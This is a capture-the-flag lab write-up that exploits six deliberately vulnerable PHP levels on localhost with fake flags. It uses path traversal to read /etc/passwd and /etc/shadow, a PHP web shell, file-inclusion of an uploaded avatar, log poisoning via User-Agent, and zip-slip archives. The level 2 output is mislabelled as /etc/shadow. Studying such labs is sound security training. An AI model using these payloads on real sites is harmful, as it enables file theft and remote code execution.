@@ -1,0 +1,548 @@
+        [-Prerequisites-]
+       
+                
+		Lets take an overview of the lab 1, which is the simpliest level but others level have the same concept
+		      
+		      Level 1------------ [FILE] dockerfile                             : setup the permission and neccessary command
+				  |
+				  | 
+				  |
+				  |
+				  |
+				  |------ [DIR] src ------------------ [DIR] css        : stored JS code of the website          
+				                          |
+				                          |
+				                          |----- [DIR] images           : Location to store image used in website
+				                          |
+				                          | 
+				                          |----- [FILE] index.php       : HTML and CSS code of the website
+				                          |
+				                          |
+				                          |----- [FILE] loadImage.php   : PHP code for the backend of website
+				                         
+                 Seems like nothing special except loadImage.php ~~~
+                 
+                 [DockerFile]
+                 
+                         
+			FROM php:7.3-apache
+			WORKDIR /var/www/html/
+			COPY ./src .
+
+			RUN chown -R root:www-data /var/www/html &&    chmod 750 /var/www/html
+
+			RUN find . -type f -exec chmod 640 {} \;
+			RUN find . -type d -exec chmod 750 {} \;
+
+			# prevent delete
+			RUN chmod +t -R /var/www/html/
+
+			RUN echo "CBJS{FAKE_FLAG_FAKE_FLAG}" >> /etc/passwd
+		
+		[?] RUN chown -R root:www-data /var/www/html &&    chmod 750 /var/www/html
+		
+		    This command setup the permission of the owner to root (highest privilege) 
+		    
+		    
+					       
+               
+
+
+	[-Exploitation-]
+	  
+	      
+	      ---------------level 1----------------
+	      |                                    |
+	      |          localhost:8091            |
+	      |                                    |
+	      --------------------------------------
+	      
+	      Before all, lets check what this website do. Obviously its the normal website contain list of free icon.
+	      
+	      Each one have the button "View", and when you click on it, you redirect to "http://localhost:8091/loadImage.php?file_name=bomb.png" 
+	                              
+	      
+	      
+	      So, as i mentioned, lets take a look at most interesting file loadImage.php 
+	      
+			<?php 
+			$file_name = $_GET['file_name'];
+			$file_path = '/var/www/html/images/' . $file_name; 
+			if (file_exists($file_path)) {
+			    header('Content-Type: image/png');
+			    readfile($file_path);
+			}
+			else { // Image file not found
+			    echo " 404 Not Found";
+			}
+
+	      => The backend use GET method to get the value of parameter "filename", then assign it to variable $file_name.
+	         Then, variable $file_path is assigned by concentination of $file_name and 'var/www/html/images'. Its simply the path to the directory have icon image.
+	      
+	      Notable that:
+	      
+	      		if (file_exists($file_path)) {
+			    header('Content-Type: image/png');
+			    readfile($file_path);
+			}
+			
+	      => If this file path exist, and this content type is image, it return the output of file to the screen.
+	      
+	      
+
+
+     [Dockerfile] 
+	                                
+			FROM php:7.3-apache
+			WORKDIR /var/www/html/
+			
+			...
+			....
+			.....
+
+			RUN echo "CBJS{FAKE_FLAG_FAKE_FLAG}" >> /etc/passwd
+			
+	       =>  This file tell us that when we access the main page  (localhost:8901), we are at /var/www/html directory at server 
+	       
+	       [!] So the idea is what if we access other directory and return the output of other file to screen by function "readfile()"?
+	   
+	   
+	           We already know to use "../" to return the parent directory of current directory, we gonna use it here!
+	       
+	   
+	   
+	  
+	  
+     [http://localhost:8091/loadImage.php?file_name=bomb.png]    
+	       
+	   
+	       We are at "images" directory (var/www/html/images).
+	       We gonna return the value of etc/passwd to the screen, which at root directory  
+	       
+	       =>  file_name = ../../../../etc/passwd (return from images directory to root directory)
+	       
+	       So, our payload is 
+	      
+	       ===> http://localhost:8091/loadImage.php?file_name=../../../../etc/passwd
+	       
+	       But, the screen return a message that "The image cannot be displayed because contained errors", because our file is not an image
+	       So, we gonna use a "curl" tool to transfer data to our terminal 
+	       
+	       
+     [Terminal]
+     
+     
+                hsw@hsw:/$ curl http://localhost:8091/loadImage.php?file_name=../../../../etc/passwd
+               
+		root:x:0:0:root:/root:/bin/bash
+		daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+		
+		...
+		....
+		.....
+		
+		_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+		CBJS{FAKE_FLAG_FAKE_FLAG}   
+	    
+	   
+         => Exploited!
+	   
+            
+           
+	 
+              ---------------level 2----------------
+	      |                                    |
+	      |          localhost:8092            |
+	      |                                    |
+	      --------------------------------------
+
+		
+	      Check the website, you can see something different from the previous level:
+	      
+	                                                                        CHANGE
+	      http://localhost:8091/loadImage.php?file_name=bomb.png            ======>              http://localhost:8092/loadImage.php?file=images/bomb.png
+	       
+         
+              SO, i think there are no pre-setup the path of parameter "file", lets check!
+              
+        [loadImage.php]
+              
+			<?php 
+			$file = $_GET['file'];
+			if (strpos($file, "..") !== false)
+			    die("Hack detected");
+			if (file_exists($file)) {
+			    header('Content-Type: image/png');
+			    readfile($file);
+			}
+			else { // Image file not found
+			    echo " 404 Not Found";
+			}?>
+			
+			
+             [!] See~, there are no "file_path" as the level 1
+              => You can access any file if you know its path
+              
+              
+       [Terminal]
+       		
+       		
+       		hsw@hsw:~$ curl http://localhost:8092/loadImage.php?file=/etc/shadow  
+       		
+       		root:x:0:0:root:/root:/bin/bash
+		daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+		
+		...
+		....
+		.....
+		
+		_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+		CBJS{FAKE_FLAG_FAKE_FLAG}
+       		
+                      
+           => Exploited!
+           
+           
+           
+              ---------------level 3----------------
+	      |                                    |
+	      |          localhost:8093            |
+	      |                                    |
+	      --------------------------------------
+           
+              Take an overview, we can see that we can upload a name of album and the file.
+              
+      [apache2.conf]
+      	
+      		<Directory "/var/www/html/upload/">
+		AllowOverride None
+		Require all granted
+
+		<FilesMatch ".*">
+		        SetHandler None
+		</FilesMatch>
+
+		Header set Content-Type application/octet-stream
+
+		<FilesMatch ".+\.jpg$">
+		        Header set Content-Type image/jpeg
+		</FilesMatch>
+		<FilesMatch ".+\.png$">
+		        Header set Content-Type image/png
+		</FilesMatch>
+		<FilesMatch ".+\.(html|txt|php)">
+		        Header set Content-Type text/plain
+		</FilesMatch>
+		</Directory>
+		
+		
+	=> We can see that "upload" directory totally cannot do anything (SetHandler: None is a configuration which is often used to prevent certain types of files from being 
+	executed by the server) and it treats all php file as text/plain
+	
+	
+	[Dockerfile]
+	
+		WORKDIR /var/www/html/
+		RUN find . -type f -exec chmod 640 {} \;
+		RUN find . -type d -exec chmod 750 {} \;
+
+		# add write permission for upload file
+		RUN chown -R root:www-data /var/www/html/upload
+		RUN chmod g+w /var/www/html/upload/
+
+		RUN chmod g+w /var/www/html/
+		
+	=> This set /var/www/html as working directory as usual, set permissions, BUT notable that:
+	
+		RUN chmod g+w /var/www/html/	
+		
+   	[!] => This allow us can write files in the /var/www/html directory 
+   
+   
+   	So, the mindset is we gonna upload a payload on /var/www/html so all restrictions in "apache2.conf" is unusable
+   	Create simple payload: echo "<?php system($_REQUEST['cmd']); ?>" > payload.php
+	Set our album name is "../.." => so the payload will be moved in /var/www/html/upload/d13f11e2441dc39638970ac65e342529/../..
+	
+	
+	
+     [http://localhost:8093/payload.php?cmd=id]
+     
+     
+     	 		uid=33(www-data) gid=33(www-data) groups=33(www-data)
+     	 	
+     	   => Exploited
+     	
+     	
+     	
+	      ---------------level 4----------------
+	      |                                    |
+	      |          localhost:8094            |
+	      |                                    |
+	      --------------------------------------
+	      
+	         This level kind of the same as level 3, but there are no "RUN chmod g+w /var/www/html/" on the Dockerfile anymore
+	      	 => The only one thing that we can upload is user's avatar, BUT
+	   
+	   
+	[profile.php]
+	
+	
+			if (isset($_FILES["fileUpload"])) {
+			// Always store as avatar.jpg
+			move_uploaded_file($_FILES["fileUpload"]["tmp_name"], "/var/www/html/upload/" . $_SESSION["name"] . "/avatar.jpg");
+			$response = "Success";
+			}
+		  
+		 => So, all the file we upload is stored as avatar.jpg
+		 [!] But lets try make a request if we upload a simple payload  
+	
+	
+	[BurpSuite]
+	
+			POST /profile.php HTTP/1.1
+			Host: localhost:8094
+			...
+			....
+			......
+			Referer: http://localhost:8094/profile.php
+			Accept-Encoding: gzip, deflate
+			Accept-Language: en-US,en;q=0.9
+			Cookie: PHPSESSID=6138faf6e606bb4e7eb8a85889017899
+			Connection: close
+
+			------WebKitFormBoundary4GWMEbBF7DJAantB
+			Content-Disposition: form-data; name="fileUpload"; filename="payload.php"
+			Content-Type: application/x-php                                                       // Here
+
+			<?php system("id"); ?>
+
+			------WebKitFormBoundary4GWMEbBF7DJAantB--
+			
+			
+		=> You see! The request stills recognize our payload as PHP even its name is "avatar.jpg"
+		So, we uploaded successfully, we need to find a way to execute it
+		I know the first thing comes into your mind is access it directly:
+		
+		
+	[Terminal] 
+	
+			hsw@hsw:~/Desktop$ curl http://localhost:8094/upload/truong/avatar.jpg
+			<?php system("id"); ?>
+
+
+		 Its not work, BUT
+		
+		
+	[game.php]	
+	
+			
+			if (!isset($_GET['game'])) {
+			header('Location: /game.php?game=fatty-bird-1.html');
+			die();
+			   }
+			$game = $_GET['game'];
+			?>
+
+			....
+			......
+			<?php include './views/' . $game; ?>
+			........
+			
+			
+		 What if we set $_GET['game'] = avatar.jpg.
+		 The include() function will evaluate and execute all code inside them 
+		
+	
+		
+		
+	[http://localhost:8094/game.php?game=../upload/truong/avatar.jpg]
+	
+		uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+		=> Exploited!	
+			
+		
+		
+	      ---------------level 5----------------
+	      |                                    |
+	      |          localhost:8095            |
+	      |                                    |
+	      --------------------------------------
+		
+		
+		Haha, i think this level is little bit tricky, when we access to this level, the only thing we can do is play game
+		Lets take a look around, the config file seems no different from previous level 4 except the Dockerfile:
+		
+	[Dockerfile]
+	
+			RUN echo '*/1 * * * * echo "" > /var/log/apache2/access.log' | crontab                    // Clear dockerfile every 1 minute
+			RUN service cron start
+
+			# Set up log files
+			RUN rm /var/log/apache2/access.log /var/log/apache2/error.log                             
+			RUN touch /var/log/apache2/access.log /var/log/apache2/error.log
+			RUN chmod 777 /var/log/apache2/access.log /var/log/apache2/error.log                      // Wow, we got full permission here
+			RUN chown www-data:www-data /var/log/apache2/access.log /var/log/apache2/error.log
+			
+
+		[!] So the mindset is we gonna use the /var/log/apache2/access.log or /var/log/apache2/error.log
+		
+		
+		
+	[index.php]  
+	
+			<?php
+			// error_reporting(0);
+			if (!isset($_GET['game'])) {
+			header('Location: /?game=fatty-bird-1.html');
+			}
+			$game = $_GET['game'];
+			?>
+
+			...
+			.....
+			
+			<?php include './views/' . $game; ?>
+		   	........
+		   	
+		   
+		=> The same "vunerable" include(), its will evaluate and execute all code inside value of "$game"  
+		[!] We got full permission in 2 log files, lets try to see it from here
+		
+      	
+	[http://localhost:8095/?game=../../../log/apache2/access.log]   
+	
+	
+			172.21.0.1 - - [26/Mar/2024:08:29:55 +0000] "GET / HTTP/1.1" 302 1526 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
+			172.21.0.1 - - [26/Mar/2024:08:29:55 +0000] "GET /?game=fatty-bird-1.html HTTP/1.1" 200 2860 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
+			172.21.0.1 - - [26/Mar/2024:08:29:56 +0000] "GET /static/img/background_game.jpg HTTP/1.1" 200 38191 "http://localhost:8095/?game=fatty-bird-1.html" "Mozilla/5.0 (X11; Ubuntu; 				Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
+			172.21.0.1 - - [26/Mar/2024:08:30:08 +0000] "GET /?game=fatty-bird-2.html HTTP/1.1" 200 964 "http://localhost:8095/?game=fatty-bird-1.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
+			172.21.0.1 - - [26/Mar/2024:08:30:13 +0000] "GET /?game=fatty-bird-1.html HTTP/1.1" 200 2860 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
+			172.21.0.1 - - [26/Mar/2024:08:30:17 +0000] "GET /?game=../../../log/apache2/access.log HTTP/1.1" 200 1152 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
+			
+		
+		=> All what we did is shown here, include GET method, user agent.
+		[!] We need a payload inside here to be execute, so the mindset is we modify the request for containing our payload 
+		
+	[BurpSuite]
+	
+	
+			GET / HTTP/1.1
+			Host: localhost:8095
+			sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
+			sec-ch-ua-mobile: ?0
+			sec-ch-ua-platform: "Linux"
+			Upgrade-Insecure-Requests: 1
+			User-Agent: <?php system('id'); ?>
+			...
+			......
+			..........
+			
+			
+	[http://localhost:8095/?game=../../../log/apache2/access.log]
+	
+			172.21.0.1 - - [26/Mar/2024:08:36:28 +0000] "GET / HTTP/1.1" 302 1489 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)  ......
+			
+			
+		=> Exploited!
+
+     	
+     	      ---------------level 6 ---------------
+	      |                                    |
+	      |          localhost:8096            |
+	      |                                    |
+	      --------------------------------------
+	      
+	      
+		When we browse our file zip, the file will be unzip at /var/www/html/upload/[session-dir]/
+		But like all previous apache2.conf, all file in var/www/html/upload is unexecutable
+	
+		[!] So we need to unzip the file at /var/www/html/, to do this, we need help from tools called "EvilArc" https://github.com/ptoomey3/evilarc/blob/master/evilarc.py
+		
+		
+	[Terminal]
+		
+			python3 evilarc.py payload.php --depth 2 --os unix --output-file payload.zip
+		
+		
+	[http://localhost:8096/payload.php]
+	
+			 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+			 
+		=> Exploited!
+		
+		
+		
+		
+		
+		
+		
+	
+               
+         
+               	
+
+	
+	
+	 
+	
+	        
+	        
+	
+
+	
+	
+	
+	    
+	
+	
+	 	  
+		  
+	  
+	  
+	  
+	  
+	  
+	  
+	
+	       
+  	       
+           	 
+	  
+	  
+	        
+	 
+	 
+	        
+	
+		 
+               
+          
+          
+              
+      
+      
+      
+     
+      
+       
+  
+ 
+  
+  
+  
+  
+  
+  
+   
+   
+   
+      
+   
+   
+   
+ 
+
+           
+
+
+    
